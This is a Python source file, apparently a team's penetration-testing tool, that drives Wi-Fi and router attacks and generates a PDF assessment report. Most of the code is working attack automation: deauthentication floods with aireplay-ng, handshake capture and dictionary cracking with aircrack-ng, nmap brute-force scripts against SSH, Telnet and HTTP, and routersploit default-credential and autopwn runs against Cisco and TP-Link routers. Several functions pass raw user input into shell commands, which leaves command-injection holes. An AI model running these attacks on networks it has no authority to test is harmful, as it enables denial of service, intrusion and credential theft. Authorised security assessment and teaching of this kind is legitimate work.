import subprocess
import pyfiglet
import nmap
import signal
import argparse
import os
import re
import sys
import pyfiglet
import importlib
import data
import csv
import keyboard
import time
import webbrowser
from colorama import init, Fore, Style


from fpdf import FPDF

#wlan0= None  # Khởi tạo biến wlan0 và bssid là None
bssid = None
channel = None
airodump_process = None
selected_interface = None


def create_report():
    
     # Cập nhật dữ liệu từ file data.py
    subnets_input, host_up, ip_scan_service, nmap_result, wifi_essid, wifi_channel, wifi_bssid, wifi_encrypt, wifi_password, wifi_version, wifi_ip, router,router_ip,router_version, router_vulnerability,router_username ,router_usrpw= update_data_from_file()
    if subnets_input is None:
        return  # Trong trường hợp không thể cập nhật dữ liệu, thoát khỏi hàm
    
    # Create a PDF object
    pdf = FPDF()

    # Add a new page
    pdf.add_page()

    # Add "REPORT" title
    pdf.set_font("Arial", 'B', size=30)
    pdf.set_xy(0, 10)  # Set position to top left corner
    pdf.cell(0, 10, " PN Report", 0, 1, 'C')  # Center the text horizontally
    
    # Set font and size initially
    pdf.set_font("Arial", size=15)
    pdf.set_text_color(0, 0, 0)  # Black text color

    # Add a blank line
    pdf.ln(10)
    
    # Check password strength
    is_strong_password = check_password_strength(wifi_password)
    
    
    strings_to_write = [
        f"I/ RECONNAISSANCE\n",
        f" *In this step, we'll try to collect as much information about the business's devices as possible to help with the next steps.",
        f" 1. Scan Multiple Subnets: {', '.join(subnets_input)}",
        f"  - Active hosts: {', '.join(host_up)}\n",
        f" 2. Access point: {wifi_essid}",
        f"  - Encrypt: {wifi_encrypt}\n",
        f" 3. Router: {router}",
        f"  - IP: {router_ip}",
        f"  - Version: {router_version}\n",
        f" 4. Scan Services: {', '.join(ip_scan_service)}",
        f"  - Active ports:",
    ]

    #Write Active ports with indentation
    for port_info in nmap_result:
        strings_to_write.append(f"        {port_info}")

    # Add remaining information
    strings_to_write.extend([
        f"\n\n\n\n\nII/ ANALYSIS OF POTENTIAL VULNERABILITIES",
        f" 1. General information collected after scanning",
        f"     - Review the data gathered from the reconnaissance phase, including active hosts, device details, and services.",
        f"   a) Active hosts: {', '.join(host_up)}\n",
        f"   b) Access Point: {wifi_essid}",
        f"      + IP Address: {wifi_ip}",
        f"      + BSSID: {wifi_bssid}",
        f"      + Channel: {wifi_channel}",
        f"      + Encrypt: {wifi_encrypt}\n",
        f"   c) Router: {router}",
        f"      + Image: C7200-ADVENTERPRISEK9-M",
        f"      + IP Adress: {router_ip}",
        f"      + Version: {router_version}\n",
        f"      + Services: {port_info}\n",
        f" 2. Narrow down which devices are vulnerable",
        f"     - We'll focus on the access point and router device",
        f"   a) For Router {router}",
        f"      + Identify open ports like telnet (23/tcp), ssh (22/tcp), and http (80/tcp).",
        f"      + Evaluate if the router's firmware is up-to-date, as newer versions often include security patches and bug fixes.",
        f"   b) For Wifi network {wifi_essid}:",
        f"      + Assess the strength of WPA2 encryption to determine susceptibility to attacks.",
        f"      + Identify any weaknesses or vulnerabilities in the Wi-Fi network configuration, such as default or easily guessable passwords.",
        f"      + Develop strategies to exploit vulnerabilities, including capturing handshake and performing dictionary attacks to assess the network's resilience to intrusion.",
        f" 3. Plan a scenario for an attack to verify it",
        f"III/ EXPLOIT\n",
        f"   Note: We will focus on exploiting typical devices such as routers and access points to prove that they have potential vulnerabilities.",
        f" 1. Access Point: {wifi_essid}",
        f"   - Vulnerability type: Weak Password Vulnerability",
        f"   - Exploit method: Dictionary attack (we can employ various methods for exploitation, but they may consume a significant amount of time.)",
        f"   - Tool support: Pennet Tool",
        f"       + IP Address: {wifi_ip}",
        f"       + BSSID: {wifi_bssid}",
        f"       + Channel: {wifi_channel}",
        f"       + Encryption: {wifi_encrypt}",
        f"       + Password:*{wifi_password}*{' => Password strong' if is_strong_password else ' ==> Successfully proved the potential vulnerability by successfully capturing easily guessed wifi passwords '}\n",

        f" 2. Router: {router}",
        f"   - Vulnerability type: Default Credentials (weak authentication)",
        f"   - Exploit method: Exploiting Default Telnet Credentials on Cisco Router",
        f"   - Tool support: Pennet Tool",
        f"       + Image: {router}",
        f"       + IP Address: {router_ip}",
        f"       + Version: {router_version}",
        f"       + Target: 23/tcp - state:open - service:telnet (Cisco router telnetd)",
        f"                       80/tcp - state:open - service:http (Cisco IOS http config)",
        f"       + Result: localhost",
        f"                    user: admin",
        f"                    password: admin",
        f"     ==> Successfully proved the potential vulnerability of weak authentication\n\n",
        f"IV/ RECOMMENDATIONS BASED ON OUR POLICY\n",
        f"   Note: Based on OUR POLICY with analysis and findings, we recommend the following actions.",
        f" 1. Strengthen Wi-Fi Network Security:",
        f"     - Upgrade encryption algorithms from WEP or WPA, WPA2 to the latest standard, WPA3, to ensure stronger protection against unauthorized access.",
        f"     - Implement a robust password policy requiring complex, unique passwords for Wi-Fi access. Consider using passphrases for added security.",
        f"     - Enable Wi-Fi Protected Access (WPA) Enterprise mode for authentication, which offers more secure authentication than WPA Personal mode.",
        f"     - Deploy intrusion detection and prevention systems (IDPS) to monitor network traffic for suspicious activities and potential security breaches.",
        f"     - References: https://www.cnet.com/home/internet/stop-home-network-hackers-top-10-tips-to-protect-your-wi-fi-security",
        f" 2. Secure the Router",
        f"     - Disable unnecessary services and close unused ports on the router to minimize the attack surface and reduce the risk of exploitation.",
        f"     - Change default administrative credentials (username and password) to strong, unique values. Use a combination of uppercase and lowercase letters, numbers, and special characters.",
        f"     - Regularly update the router firmware to patch known vulnerabilities and ensure that the latest security updates are applied.",
        f"     - Implement strong access control policies to restrict administrative access to the router, allowing only authorized personnel to make configuration changes.",
        f"     - References: https://www.linkedin.com/advice/1/what-best-practices-securing-your-router-skills-technical-support-rfisc",
        f" 3. Conduct Security Awareness Training:",
        f"     - Provide comprehensive security awareness training to all employees to educate them about the importance of cybersecurity and best practices for safeguarding sensitive information.",
        f"     - Offer phishing awareness training to help employees recognize and report suspicious emails and phishing attempts.",
        f"     - Conduct regular security drills and simulations to test employees'responses to security incidents and reinforce training.",
        f"     - References: https://aware.eccouncil.org/security-awareness-training-6-important-training-practices.html",
        f" 4. Implement Regular Security Audits:",
        f"     - Schedule periodic security assessments and audits to identify vulnerabilities, misconfigurations, and weaknesses in the network infrastructure.",
        f"     - Perform penetration testing and vulnerability scanning to simulate real-world attacks and evaluate the effectiveness of existing security controls.",
        f"     - Establish a formal incident response plan outlining procedures for detecting, responding to, and recovering from security incidents.",
        f"     - References: https://www.linkedin.com/pulse/how-conduct-regular-security-audits-safety-ops-specialists/",
        f" 5. Follow Industry Standards and Guidelines:",
        f"     - Align security practices with industry standards and best practices, such as the NIST Cybersecurity Framework, CIS Controls, and ISO/IEC 27001.",
        f"     - Stay informed about emerging threats and security trends by participating in industry forums, conferences, and information-sharing communities.",
        f"     - Engage with cybersecurity professionals and consultants to assess security posture, address compliance requirements, and implement risk management strategies",
        f"     - References: https://fastercapital.com/content/Industry-Standards--How-to-Learn-and-Follow-the-Industry-Standards-for-Your-Technical-and-Occupational-Field.html",
    ])


    # Write each string with appropriate formatting
    for string_to_write in strings_to_write:
        if string_to_write.startswith("I/ RECONNAISSANCE"):
            write_with_formatting(pdf, string_to_write, bold=True, italic=True)  # Bold and Italic for Wifi:
        elif string_to_write.startswith(" 1. Scan Multiple Subnets:"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith(" 2. Access point:"):
            write_with_formatting(pdf, string_to_write, bold=True) 
        elif string_to_write.startswith(" 3. Router:"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith(" 4. Scan Services:"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith("\n\n\n\n\nII/ ANALYSIS OF POTENTIAL VULNERABILITIES"):
            write_with_formatting(pdf, string_to_write, bold=True, italic=True)
        elif string_to_write.startswith(" 1. General information collected after scanning"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith(" 2. Narrow down which devices are vulnerable"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith(" 3. Plan a scenario for an attack to verify it"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith("III/ EXPLOIT"):
            write_with_formatting(pdf, string_to_write, bold=True, italic=True)
        elif string_to_write.startswith(" 1. Access Point:"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith(" 2. Router:"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith("IV/ RECOMMENDATIONS BASED ON OUR POLICY\n"):
            write_with_formatting(pdf, string_to_write, bold=True, italic=True)
        elif string_to_write.startswith(" 1. Strengthen Wi-Fi Network Security:"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith(" 2. Secure the Router"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith(" 3. Conduct Security Awareness Training:"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith(" 4. Implement Regular Security Audits:"):
            write_with_formatting(pdf, string_to_write, bold=True)
        elif string_to_write.startswith(" 5. Follow Industry Standards and Guidelines:"):
            write_with_formatting(pdf, string_to_write, bold=True)
        else:
            write_with_formatting(pdf, string_to_write)  # No formatting for other lines


    # Take user input for the file name
    pdf_file_name = input("Enter the name of the PDF file: ") + ".pdf"

    # Save the PDF file
    pdf.output(pdf_file_name)

    # Open the PDF file using the default PDF viewer
    os.system(f"xdg-open '{pdf_file_name}'")

    print(f"The PDF file '{pdf_file_name}' has been created and opened successfully.")
    return
    
def write_with_formatting(pdf, text, bold=False, italic=False):
    """
    Writes text to the PDF with optional bold and/or italic formatting.
    """
    # Set font style based on formatting flags
    font_style = ''
    if bold and italic:
        font_style = 'BI'  # Bold and Italic
    elif bold:
        font_style = 'B'   # Bold
    elif italic:
        font_style = 'I'   # Italic

    # Write the text with left alignment
    pdf.set_font("Arial", style=font_style)  # Specify font family and style
    pdf.multi_cell(0, 10, txt=text, border=0, align='L')
    
def update_data_from_file():
    try:
        importlib.reload(data)  # Làm mới module data trước khi import biến
        from data import subnets_input, host_up, ip_scan_service, nmap_result, wifi_essid, wifi_channel, wifi_bssid, wifi_encrypt, wifi_password, wifi_version, wifi_ip ,router, router_ip, router_version, router_vulnerability,router_username ,router_usrpw
    except ImportError:
        print("Error: Unable to import data from data.py")
        return None
    
    return subnets_input, host_up, ip_scan_service, nmap_result, wifi_essid, wifi_channel, wifi_bssid, wifi_encrypt, wifi_password, wifi_version, wifi_ip, router,router_ip , router_version, router_vulnerability,router_username ,router_usrpw

def check_password_strength(password):
    """
    Checks the strength of a password.
    Returns True if the password is strong, False if it is weak.
    """
    # Define regex patterns for strong and weak passwords
    strong_pattern = r'^(?=.*[A-Z])(?=.*[a-z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$'
    weak_pattern = r'^(?=.*[A-Za-z\d])[A-Za-z\d]{8,}$'
    
    # Check if the password matches the strong pattern
    if re.match(strong_pattern, password):
        return True
    # Check if the password matches the weak pattern
    elif re.match(weak_pattern, password):
        return False
    # If the password doesn't match either pattern, it's considered weak
    else:
        return False
        

def extract_credentials_from_file(file_name):
    router_username = None
    router_usrpw = None

    with open(file_name, "r") as f:
        content = f.read()

    # Tìm vị trí của "Username: '" trong nội dung
    username_start = content.find("Username: '")
    if username_start != -1:
        # Di chuyển vị trí bắt đầu của username xuống sau cặp kí tự "'"
        username_start += len("Username: '")
        # Tìm vị trí kết thúc của username
        username_end = content.find("'", username_start)
        # Lấy chuỗi username từ vị trí bắt đầu đến vị trí kết thúc
        router_username = content[username_start:username_end]

    # Tìm vị trí của "Password: '" trong nội dung
    password_start = content.find("Password: '")
    if password_start != -1:
        # Di chuyển vị trí bắt đầu của password xuống sau cặp kí tự "'"
        password_start += len("Password: '")
        # Tìm vị trí kết thúc của password
        password_end = content.find("'", password_start)
        # Lấy chuỗi password từ vị trí bắt đầu đến vị trí kết thúc
        router_usrpw = content[password_start:password_end]

    return router_username, router_usrpw

def parse_nmap_result(nmap_result):
    # Khởi tạo một danh sách để lưu thông tin về các cổng và dịch vụ
    port_services = []

    # Phân tích kết quả từ Nmap để lấy thông tin về cổng và dịch vụ tương ứng
    lines = nmap_result.split('\n')
    for line in lines:
        # Tách dòng thành các phần bằng dấu cách
        parts = line.split()

        # Kiểm tra xem dòng có đủ phần để chứa thông tin về cổng và dịch vụ không
        if len(parts) >= 3 and '/' in parts[0]:
            port = parts[0]  # Số cổng
            state = parts[1]  # Trạng thái
            service = ' '.join(parts[2:])  # Dịch vụ

            # Thêm thông tin về cổng và dịch vụ vào danh sách
            port_services.append((port, state, service))
    return port_services   
    
def append_to_file(variable_name, data, filename):
    if variable_name == 'nmap_result':
        # Nếu tên biến là 'nmap_result', phân tích kết quả từ Nmap
        port_services = parse_nmap_result(data)

        # Chuyển đổi thông tin về cổng và dịch vụ thành chuỗi danh sách
        values_str = "[" + ", ".join([f'"{port} - state:{state} - service:{service}"' for port, state, service in port_services]) + "]"
        
    elif variable_name == 'ip_scan_service':
        # Xử lý dữ liệu địa chỉ IP quét
        if isinstance(data, list):
            # Nếu data là một danh sách, chuyển đổi thành chuỗi danh sách
            values_str = "[" + ", ".join([f'"{item}"' for item in data]) + "]"
        else:
            # Nếu không, sử dụng dữ liệu như thông tin đã cho
            values_str = f'["{data}"]'
            
    elif variable_name == 'router_vulnerability':
        # Kiểm tra nếu data là một chuỗi, sau đó ghi vào file với định dạng phù hợp
        if isinstance(data, str):
            values_str = f'"{data}"'  # Đặt giá trị trong dấu nháy kép
            with open(filename, 'a') as file:
                file.write(f"{variable_name}= {values_str}\n")
        else:
            print("The value of router_vulnerability must be a string.")
    
    elif variable_name == 'router_username':
        if isinstance(data,list):
            values_str = "[" + ", ".join([f'"{item}"' for item in data]) + "]"
        else:
            values_str = f'"{data}"'
            
    elif variable_name == 'router_usrpw':
        if isinstance(data,list):
            values_str = "[" + ", ".join([f'"{item}"' for item in data]) + "]"
        else:
            values_str = f'"{data}"'
            
    elif variable_name == 'router_ip':
        # Xử lý dữ liệu địa chỉ IP quét
        if isinstance(data, list):
            # Nếu data là một danh sách, chuyển đổi thành chuỗi danh sách
            values_str = "[" + ", ".join([f'"{item}"' for item in data]) + "]"
        else:
            # Nếu không, sử dụng dữ liệu như thông tin đã cho
            values_str = f'"{data}"'
            
    elif variable_name == 'wifi_channel':
        # Xử lý kết quả của wifi_channel
        if isinstance(data, list):
            values_str = ", ".join(map(str, data))  # Chuyển danh sách thành chuỗi, không có kí tự [,]
        else:
            values_str = f'"{data}"'
            
    elif variable_name == 'wifi_bssid':
        # Xử lý kết quả của wifi_bssid
        if isinstance(data, list):
            values_str = ", ".join(map(str, data))  # Chuyển danh sách thành chuỗi, không có kí tự [,]
        else:
            values_str = f'"{data}"'
            
    elif variable_name == 'wifi_password':
        keyfound_str = '"{}"'.format(''.join(data))
        values_str = keyfound_str.replace(",", ", ")
        
    elif variable_name == 'wifi_essid':
        # Xử lý dữ liệu cho wifi_essid
        essid_str = '"{}"'.format(''.join(data))
        values_str = essid_str.replace(",", ", ")
        
    elif variable_name == 'wifi_encrypt':
        # Xử lý dữ liệu cho wifi_encrypt
        encrypt_str = '"{}"'.format(''.join(data))
        values_str = encrypt_str.replace(",", ", ")
    else:
        if isinstance(data, list):
            values_str = "[" + ", ".join([f'"{item}"' for item in data]) + "]"
        else:
            values_str = ', '.join(map(str, data))

   
        
        # Tiến hành ghi dữ liệu vào file
    with open(filename, 'r') as file:
        lines = file.readlines()
    found = False
    new_lines = []
    for line in lines:
        if line.startswith(f"{variable_name}="):
            found = True
            new_lines.append(f"{variable_name}= {values_str}\n")
        else:
            new_lines.append(line)

     # Kiểm tra nếu biến chưa tồn tại trong file thì thêm vào danh sách dòng mới
    if not found:
        new_lines.append(f"{variable_name}= {values_str}\n")

    # Ghi lại tất cả các dòng vào file
    with open(filename, 'w') as file:
        file.writelines(new_lines)

def run_nmap_scan(target, all_ports=False):
    try:
        # Construct the Nmap command
        if all_ports:
            nmap_command = ["nmap", "-sV", "-A", "-O", target]
        else:
            nmap_command = ["nmap", "-sV", "-A", "-O", "-p 21,22,23,25,80,443", target]

        # Run the Nmap scan
        result = subprocess.run(nmap_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Check for errors
        if result.returncode == 0:
            print("Nmap scan completed successfully:")
            print(result.stdout)
            append_to_file('nmap_result', result.stdout, 'data.py')
        else:
            print("Nmap scan encountered an error:")
            print(result.stderr)
    except Exception as e:
        print("An error occurred:", str(e))

def host_discovery(network):
    """Scans a network for active hosts and returns a list of IP addresses."""
    scanner = nmap.PortScanner()
    scanner.scan(network, arguments="--unprivileged -sn")

    hosts = []
    for host in scanner.all_hosts():
        if scanner[host].state() == "up":
            hosts.append(host)
    return hosts



def start_monitor_mode(interface):
    global selected_interface
    subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.DEVNULL)
    interfaces_info = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
    interfaces = interfaces_info.stdout.split('\n')
    
    # Lọc ra tất cả các tên interface và chipset của WLAN
    interface_chipsets = {}
    for line in interfaces:
        if 'mtu' in line:
            parts = line.strip().split(':')
            interface_name = parts[1].strip().split()[0]
            interface_chipsets[interface_name] = None
            if 'wlan' in interface_name:
                # Lấy chipset của card WLAN
                chipset_info = subprocess.run(['iw', 'dev', interface_name, 'info'], capture_output=True, text=True)
                for info_line in chipset_info.stdout.split('\n'):
                    if 'type' in info_line.lower():
                        interface_chipsets[interface_name] = info_line.split()[-1].capitalize() if info_line.split()[-1] != "unknown" else None
                        break
    
    # Chạy lệnh lspci và lọc output
    lspci_output = subprocess.run(['lspci'], capture_output=True, text=True).stdout
    # Lọc dòng chỉ bao gồm thông tin Ethernet controller
    lspci_output_filtered = [line.split(' ', 1)[1].replace("Ethernet controller: ", "") for line in lspci_output.split('\n') if 'Ethernet controller' in line]

    # Chạy lệnh airmon-ng và loại bỏ hàng đầu tiên, sau đó lọc output
    airmon_output = subprocess.run(['airmon-ng'], capture_output=True, text=True).stdout
    lines_airmon = [line.split()[3:] for line in airmon_output.split('\n')[3:] if len(line.split()) >= 4]

    # Biến để lưu các dòng output trước "LIST OF INTERFACES"
    pre_interface_output = []

    for line in lspci_output_filtered:
        pre_interface_output.append(line)

    for line in lines_airmon:
        pre_interface_output.append(' '.join(line))



    max_len = max([len(line) for line in pre_interface_output]) if pre_interface_output else 0

    print("\033[34m\033[1m\n-------------------------------------------------- LIST OF INTERFACES --------------------------------------------------\033[0m\n")
    for i, (intf, chipset) in enumerate(interface_chipsets.items()):
        chipset_output = f"{chipset} " if chipset else "None "
        chipset_output = chipset_output.capitalize() if chipset_output != "None " else chipset_output
        # Tính toán số khoảng trắng cần thêm để căn đều khoảng cách
        padding_spaces = max_len - 60 - len(chipset_output)
        # In dòng thông tin với khoảng trắng căn đều
        print(f"\033[37m\033[1m{i+1}. \033[37m{intf:<{max_len-60}} \033[0m\033[1m\033[33mMode:\033[37m\033[1m {chipset_output}{' ' * padding_spaces}\033[36m//\033[0m    \033[1m\033[33mChipset:\033[37m {lspci_output_filtered[0] if 'eth' in intf else ' '.join(lines_airmon[0]) if 'wlan' in intf else 'None'}\033[0m")

    while True:
        try:
            selected_index = int(input("\n\033[1mSelect an interface to work with: ").strip()) - 1
            if 0 <= selected_index < len(interface_chipsets):
                selected_interface = list(interface_chipsets.keys())[selected_index]
                return selected_interface
            elif selected_index == -1:
                print("\033[1mReturning to the main menu...")
                return None
            else:
                print("\n\033[31m\033[1;3mInvalid number. Please enter a valid number.\033[0m")
        except ValueError:
            print("\n\033[31m\033[1;3mInvalid input. Please enter a valid number.\033[0m")



def capture_traffic(interface):
    try:
        airodump_process = subprocess.Popen(['airodump-ng', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        while True:
            line = airodump_process.stdout.readline()
            if line.strip():
                print(Fore.WHITE + Style.BRIGHT + line.strip())  # In đậm output
    except KeyboardInterrupt:
        # Nếu bắt được Ctrl + C từ người dùng, gửi tín hiệu kết thúc đến tiến trình con
        airodump_process.send_signal(signal.SIGINT)
        airodump_process.wait()  # Chờ tiến trình con kết thúc hoàn toàn
        #Xử lý tín hiệu Ctrl+C để dừng quá trình và thoát hẳn
        print("\n\033[31m\033[1mProcess has stopped!")
    except Exception as e:
        print("\033[31mFailed:", str(e))

def run_airodump():
    global selected_interface, bssid, channel  #global
    try:
        if selected_interface:
            channel = input("Channel: ")
            bssid = input("BSSID: ")
            output_file = input("Name of File(/home/kali/Desktop/'name'): ")
            command = f"iwconfig {selected_interface} channel {channel} && airodump-ng {selected_interface} -c {channel} --bssid {bssid} -w {output_file}"
            subprocess.Popen(['gnome-terminal', '--title=Capture Handshake', '--', 'bash', '-c', command])
            append_to_file('wifi_channel', channel,'data.py')
            append_to_file('wifi_bssid', bssid,'data.py')
        else:
            print("\n\033[31m\033[1;3mInvalid value interface!.\033[0m")
    except KeyboardInterrupt:
        print("\n\033[33m\033[1mYou have stopped! Back to main menu.")
    except Exception as e:
        print("\033[31mFailed:", str(e))

def run_aireplay():
    global selected_interface, bssid, channel
    try:
        if selected_interface: 
            if not bssid and not channel:
                bssid1 = input("Input BSSID: ")
                channel1 = input("Input channel: ")
                numberddos = input("Number of Dos: ")
                command = f"iwconfig {selected_interface} channel {channel1} && aireplay-ng -0 {numberddos} -a {bssid1} {selected_interface}"
                subprocess.Popen(['gnome-terminal', '--title=Deauth All Client', '--', 'bash', '-c', command])                
            elif bssid and channel:
                numberddos = input("Number of Dos: ")
                command = f"iwconfig {selected_interface} channel {channel} && aireplay-ng -0 {numberddos} -a {bssid} {selected_interface}"
                subprocess.Popen(['gnome-terminal', '--title=Deauth All Client', '--', 'bash', '-c', command])
            else: 
                print("\n\033[31m\033[1;3mInvalid BSSID and Channel!\033[0m")
        else:
            print("\n\033[31m\033[1;3mInvalid value interface!.\033[0m")
    except KeyboardInterrupt:
        print("\n\033[33m\033[1mYou have stopped! Back to main menu.")
    except Exception as e:
        print("\033[1mFailed:", str(e))

def run_aireplay_2(): #Cái này dành cho DOS Wifi tự do không bị ràng buộc bởi chức năng Capture Handshake -- Hiện tại chưa thêm vào tool
    global selected_interface
    try:
        if selected_interface:
                bssid2 = input("Input BSSID: ")
                channel2 = input("Input channel: ")
                numberddos2 = input("Number of Dos: ")
                command = f"iwconfig {selected_interface} channel {channel2} && aireplay-ng -0 {numberddos2} -a {bssid2} {selected_interface}"
                subprocess.Popen(['gnome-terminal', '--title=Deauth All Client', '--', 'bash', '-c', command])     
        else:
            print("\n\033[31m\033[1;3mInvalid value interface!.\033[0m")
    except KeyboardInterrupt:
        print("\n\033[33m\033[1mYou have stopped! Back to main menu.")
    except Exception as e:
        print("\033[31mFailed:", str(e))


def brute_wep(bssid, channel, file_name):
    global selected_interface
    try:
        if selected_interface:
            cmd1 = f"gnome-terminal -- airodump-ng --bssid {bssid} -c {channel} -w {file_name} {selected_interface}"
            cmd2 = f"gnome-terminal -- bash -c 'besside-ng {selected_interface} -c {channel} -b {bssid}; read line'"
            subprocess.Popen(cmd1, shell=True)
            subprocess.Popen(cmd2, shell=True)
        else:
            print("\n\033[31m\033[1;3mInvalid value interface!.\033[0m")
    except Exception as e:
        print("\033[31mFailed:", str(e))

def crack_wep(file_name):
    cmd = f"gnome-terminal -- bash -c 'aircrack-ng {file_name}; read line'"
    subprocess.Popen(cmd, shell=True)

def run_aircrack():
    try:
        #while True:
            wordlist = input("Link of wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
            if not wordlist:
                wordlist = "/usr/share/wordlists/rockyou.txt"
            file = input("Name of File (/home/kali/Desktop/'name.cap'): ")

            prefix = file.split('.')[0]  # Lấy phần prefix từ tên tệp        
            privacy_infor = prefix + ".csv" # Thay đổi đuôi của tệp thành ".csv
            with open(privacy_infor, newline='') as csvfile: # Lọc dữ liệu từ file CSV chỉ lấy dòng thứ 3 và cột số 6
                csvreader = csv.reader(csvfile)
                wifi_encrypt = None
                for i, row in enumerate(csvreader):
                    if i == 2:  # Dòng thứ 3
                        wifi_encrypt = row[5]  # Cột số 6 (chỉ số 5)
                        wifi_essid = row[13]
                        break
            if wifi_encrypt and wifi_essid:     # Gửi giá trị của ESSID và loại mã hóa sang file data.py
                append_to_file('wifi_encrypt', wifi_encrypt, 'data.py')
                append_to_file('wifi_essid', wifi_essid, 'data.py')
            else:
                print("Không tìm thấy thông tin trong file CSV.")
            
            # Chạy lệnh aircrack-ng và bắt đầu lấy đầu ra
            subprocess.run(["aircrack-ng", file, "-w", wordlist])
            wifi_info = subprocess.run(["aircrack-ng", file, "-w", wordlist], capture_output=True, text=True)


            # Sử dụng biểu thức chính quy để tìm kiếm thông tin về Key Found
            pattern_key_found = r"KEY FOUND! \[ (.+?) \]"
            match_key_found = re.search(pattern_key_found, wifi_info.stdout)
        
            if match_key_found:
                key_found = match_key_found.group(1)

                # Gửi giá trị của Key Found sang file data.py
                append_to_file('wifi_password', key_found, 'data.py')
            else:
                print("Không tìm thấy thông tin về Key Found.") #-l password; read line'")

    #         break
    except KeyboardInterrupt:
        print("\n\033[33m\033[1mYou have stopped! Back to main menu.")
    except Exception as e:
        print("\033[31mFailed:", str(e))


def run_nmap(target, port, script, wl):
    command = f"nmap -p {port} --script {script} --script-args userdb={wl},passdb={wl},telnet-brute.timeout=8s {target}"
    subprocess.run(command, shell=True)

def brute_force_ssh():
    ip = input("Input IP: ")
    userdb = input("Input wordlist user: ")
    passdb = input("Input wordlist pass: ")
    os.system(f"nmap -p 22 --script ssh-brute --script-args userdb={userdb},passdb={passdb} {ip}")

def brute_force_telnet():
    ip = input("Input IP: ")
    userdb = input("Input wordlist user: ")
    passdb = input("Input wordlist pass: ")
    os.system(f"nmap -p 23 --script telnet-brute --script-args userdb={userdb},passdb={passdb} {ip}")

def brute_force_http():
    ip = input("Input IP: ")
    userdb = input("Input wordlist for user: ")
    passdb = input("Input wordlist for pass: ")
    os.system(f'nmap -p 80 --script=http-form-brute,http-brute --script-args userdb={userdb},passdb={passdb} {ip}')


def exploit():
    print("\n\033[1m.----------- ROUTER ------------.")
    print("\033[32m.-------------------------------.")
    print("|\033[37m 1. Cisco \033[32m                     |")
    print("|\033[37m 2. TP-Link  \033[32m                  |")
    print("|\033[37m 3. Auto Scan             \033[32m     |")
    print("|\033[37m 4. Back To Main Menu   \033[32m       |")
    print("._______________________________.\033[0m")
    router_choice = input("\n\033[1mChoose a number: ")

    if router_choice == "1":
        cisco_exploit()
    elif router_choice == "2":
        tplink_exploit()
    elif router_choice == "3":
        auto_scan()
    elif router_choice == "4":
        return
    else:
        print("\n\033[31m\033[1;3mInvalid choice. Please select again.\033[0m")
        exploit()

def cisco_exploit():
    print("\n\033[1m.-------- CISCO EXPLOIT --------.")
    print("\033[32m.-------------------------------.")
    print("|\033[37m 1. FTP \033[32m                       |")
    print("|\033[37m 2. SSH  \033[32m                      |")
    print("|\033[37m 3. Telnet             \033[32m        |")
    print("|\033[37m 4. Back To Main Menu   \033[32m       |")
    print("._______________________________.\033[0m")
    choice = input("\n\033[1mChoose a number: ")

    if choice == "1":
        exploit_with_credentials("cisco", "ftp_default_creds", "ftp-cisco.txt")
    elif choice == "2":
        exploit_with_credentials("cisco", "ssh_default_creds", "ssh-cisco.txt")
    elif choice == "3":
        router_vulnerability= "Default Credentials Attack"
        append_to_file('router_vulnerability', router_vulnerability,'data.py')
        exploit_with_credentials("cisco", "telnet_default_creds", "telnet-cisco.txt")
    elif choice == "4":
        exploit()
    else:
        print("\n\033[31m\033[1;3mInvalid choice. Please select again.\033[0m")
        cisco_exploit()

def tplink_exploit():
    print("\n\033[1m.------- TP-LINK EXPLOIT -------.")
    print("\033[32m.-------------------------------.")
    print("|\033[37m 1. FTP \033[32m                       |")
    print("|\033[37m 2. SSH  \033[32m                      |")
    print("|\033[37m 3. Telnet             \033[32m        |")
    print("|\033[37m 4. Back To Main Menu   \033[32m       |")
    print("._______________________________.\033[0m")
    choice = input("\n\033[1mChoose a number: ")

    if choice == "1":
        exploit_with_credentials("tplink", "ftp_default_creds", "ftp-tplink.txt")
    elif choice == "2":
        exploit_with_credentials("tplink", "ssh_default_creds", "ssh-tplink.txt")
    elif choice == "3":
        exploit_with_credentials("tplink", "telnet_default_creds", "telnet-tplink.txt")
    elif choice == "4":
        exploit()
    else:
        print("\n\033[31m\033[1;3mInvalid choice. Please select again.\033[0m")
        tplink_exploit()

def auto_scan():
    ip_address = input("Enter the target IP address: ")
    if os.path.exists("auto-scan.txt"):
        with open("auto-scan.txt", "w") as f:
            f.truncate(0)  # Xóa dữ liệu trong tệp
    os.system(f"routersploit -m scanners/autopwn -s 'target {ip_address}' | tee -a auto-scan.txt")
    exploit()

def exploit_with_credentials(router, credential, output_file):
    ip_address = input("Enter the target IP address: ")
    append_to_file('router_ip',ip_address,'data.py')
    if os.path.exists(output_file):
        with open(output_file, "w") as f:
            f.truncate(0)  # Xóa dữ liệu trong tệp
    os.system(f"routersploit -m creds/routers/{router}/{credential} -s 'target {ip_address}' | tee -a {output_file}") 
    router_username, router_usrpw = extract_credentials_from_file("telnet-cisco.txt")
    append_to_file('router_username',router_username,'data.py')
    append_to_file('router_usrpw',router_usrpw,'data.py')
    exploit()

def press_a_twice():
    keyboard.send('a', do_release=True)  # Gửi 'a'
    time.sleep(0.1)  # Chờ 0.1 giây
    keyboard.send('a', do_release=True)  # Gửi 'a' lần thứ hai
    time.sleep(0.1)  # Chờ 0.1 giây
    keyboard.send('a', do_release=True)  # Gửi 'a' lần thứ ba

    

def red(text):
    return f"\033[33m\033[1m{text}\033[0m"

# Xóa màn hình
os.system('clear')

result = pyfiglet.figlet_format("PenNet Team")
red_result = red(result)
print(red_result)
